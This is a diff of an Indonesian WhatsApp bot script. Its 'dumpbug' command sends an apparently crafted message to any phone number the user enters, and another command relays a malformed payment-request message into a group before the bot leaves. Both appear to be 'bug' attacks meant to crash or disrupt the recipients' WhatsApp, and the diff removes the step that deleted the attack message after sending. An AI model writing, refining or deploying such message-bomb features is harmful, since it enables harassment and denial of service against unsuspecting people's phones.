@@ -177,9 +177,7 @@ if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${pre
 if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}dumpbug ${senderNumber}`)
 if (args[0].startsWith(`${nomorDeveloper}`)) return reply('Tidak bisa mengirim bug ke nomor developer!')
 if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim bug ke nomor ini!')
-let dumpbug = await semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "‎" }, { quoted: contactMessage })
-await sleep(1000)
-semar.sendMessage(`${dn}@s.whatsapp.net`, { delete: dumpbug.key })
+semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "‎" }, { quoted: contactMessage })
 reply(`Sukses mengirim bug ke nomor ${dn}`)
 break
 
@@ -189,7 +187,6 @@ if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
 if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
 requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "‎"}}}), { userJid: msg.chat })
 semar.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
-await sleep(3000)
 await semar.groupLeave(from)
 break
 
